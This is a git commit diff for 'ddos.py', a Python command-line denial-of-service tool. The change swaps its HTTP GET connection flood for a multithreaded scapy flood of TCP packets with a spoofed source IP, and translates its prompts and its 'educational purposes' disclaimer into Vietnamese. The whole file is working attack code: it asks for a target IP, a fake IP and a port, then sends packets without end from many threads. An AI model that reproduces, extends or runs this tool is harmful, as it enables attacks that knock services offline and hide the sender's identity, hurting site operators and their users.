d899668287f255443dedb90f729bb1dfe361f086
dhungx <139793488+dhungx@users.noreply.github.com>
2024-08-10 21:06:15 +0700

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,70 +1,65 @@
 #!/usr/bin/python3
 import os
-import socket
 import threading
 import time
+from scapy.all import IP, TCP, send
 from colorama import Fore, Style
-from urllib.parse import urlparse
 
-def ddos():
+def ddos_with_spoofing():
     os.system("clear")
-    print("press CTRL + C and press ENTER to exit !!!")
-    while True:
-        try:
-            threads = int(input("ENTER NUMBER OF THREADS : "))
-        except ValueError:
-            print("please enter a integer value")
-            continue
-        else:
-            break
-    attack_num = 0
-    while True:
-        target_url = input(Fore.RED + Style.BRIGHT + "ENTER URL OF THE HOST : ")
-        parsed_url = urlparse(target_url)
-        if parsed_url.scheme and parsed_url.netloc:
-            trget = parsed_url.netloc
-            break
-        else:
-            print("Invalid URL. Please try again.")
-
-    fake = '192.178.1.38'
+    print("Nhấn CTRL + C và nhấn ENTER để thoát!!!")
 
     while True:
         try:
-            port = int(input("ENTER PORT (default port : 80 ) : ") or 80)
+            threads = int(input("NHẬP SỐ LƯỢNG LUỒNG: "))
         except ValueError:
-            print("Please enter a valid port , please try again")
+            print("Vui lòng nhập một giá trị nguyên.")
             continue
         else:
             break
 
-    print(f"performing Ddos on {target_url} (Host: {trget}) on PORT {port} using FAKE IP {fake}")
-    print(Fore.YELLOW + Style.BRIGHT + "[INFO!]" + Fore.WHITE + " if the above information is incorrect, you can restart the script and again enter the details correctly!!")
+    while True:
+        target_ip = input(Fore.RED + Style.BRIGHT + "NHẬP IP CỦA MỤC TIÊU: ")
+        if target_ip:
+            break
+        else:
+            print("IP không hợp lệ. Vui lòng thử lại.")
+
+    fake_ip = input("NHẬP IP GIẢ: ")
+
+    while True:
+        try:
+            target_port = int(input("NHẬP CỔNG CỦA MỤC TIÊU (cổng mặc định: 80): ") or 80)
+        except ValueError:
+            print("Vui lòng nhập một cổng hợp lệ, hãy thử lại.")
+            continue
+        else:
+            break
+
+    print(f"Đang thực hiện Ddos với IP giả {fake_ip} trên {target_ip} (Cổng: {target_port})")
+    print(Fore.YELLOW + Style.BRIGHT + "[THÔNG TIN!]" + Fore.WHITE + " Nếu thông tin trên không chính xác, bạn có thể khởi động lại script và nhập lại chi tiết đúng!!")
 
     time.sleep(4)
-    print(Fore.MAGENTA + Style.BRIGHT + "DDos starting in ~")
-    print("seconds : 3")
+    print(Fore.MAGENTA + Style.BRIGHT + "Ddos bắt đầu trong ~")
+    print("giây: 3")
     time.sleep(1)
-    print("seconds : 2")
+    print("giây: 2")
     time.sleep(1)
-    print("seconds : 1")
+    print("giây: 1")
     time.sleep(1)
 
+    attack_num = 0
     def attack():
         nonlocal attack_num
         while True:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((trget, port))
-                s.sendto(("GET /" + parsed_url.path + " HTTP/1.1\r\n").encode("ascii"), (trget, port))
-                s.sendto(('Host: ' + trget + '\r\n\r\n').encode('ascii'), (trget, port))
-
+                packet = IP(src=fake_ip, dst=target_ip) / TCP(dport=target_port)
+                send(packet, verbose=False)
                 attack_num += 1
-                print("packet send!! attack number : " + str(attack_num))
-            except socket.error:
-                print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK URL OR PORT')
+                print(f"Gói tin đã gửi! Số lần tấn công: {attack_num}")
+            except Exception as e:
+                print(f"Lỗi: {e}")
                 break
-                s.close()
 
     for i in range(threads):
         thread = threading.Thread(target=attack)
@@ -86,26 +81,25 @@ def print_red_centered_art():
     ''' 
     red_art2 = f"{Fore.RED}{art2}{Style.RESET_ALL}"
     print(red_art2.center(80))
-    print(Fore.YELLOW + Style.BRIGHT + "[the developer is not responsible for any kind of illegal activity done with this tool, this tool only represents how ddos attacks work and it is made for educational purposes.]")
+    print(Fore.YELLOW + Style.BRIGHT + "[Nhà phát triển không chịu trách nhiệm cho bất kỳ hoạt động bất hợp pháp nào được thực hiện với công cụ này, công cụ này chỉ đại diện cho cách thức hoạt động của các cuộc tấn công ddos và nó được tạo ra cho mục đích giáo dục.]")
+
+def menu():
+    print(Style.BRIGHT + Fore.YELLOW + "[THÔNG TIN!]" + Fore.WHITE + "Nhấn CTRL + C và nhấn enter để thoát!!")
+    print(Fore.BLUE + Style.BRIGHT + "=====================>>>>>>>>>>>>>>>>")
+    print(Fore.WHITE + Style.BRIGHT + "Vui lòng chọn từ các tùy chọn sau...")
+    print(Fore.WHITE + Style.BRIGHT + "1. DDos một trang web.  [1]")
+    print(Fore.WHITE + Style.BRIGHT + "2. Thoát.               [2]")
+    print("Nhập tùy chọn của bạn .. [ví dụ 1,2]") 
+    usr = input(Fore.GREEN + Style.BRIGHT + ">>>> ")
+    if usr == "1":
+        ddos_with_spoofing()
+    elif usr == "2":
+        print("Đang thoát...")
+        time.sleep(1)
+    else:
+        print("Tùy chọn không hợp lệ..thử lại.")
+        menu()
 
 if __name__ == "__main__":
     print_red_centered_art()
-
-def menu():
-    print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.WHITE + "Press CTRL + C and press enter to exit!!")
-    print(Fore.BLUE + Style.BRIGHT + "=====================>>>>>>>>>>>>>>>>")
-    print(Fore.WHITE + Style.BRIGHT + "please select from the following options...")
-    print(Fore.WHITE + Style.BRIGHT + "1. DDos a website.  [1]")
-    print(Fore.WHITE + Style.BRIGHT + "2. exit.            [2]")
-    print("Enter your options .. [e.g 1,2]") 
-    usr = input(Fore.GREEN + Style.BRIGHT + ">>>> ")
-    if usr == "1":
-        ddos()
-    elif usr == "2":
-        print("Exiting...")
-        time.sleep(1)
-    else:
-        print("invalid option..try again.")
-        menu()
-
-menu()
+    menu()
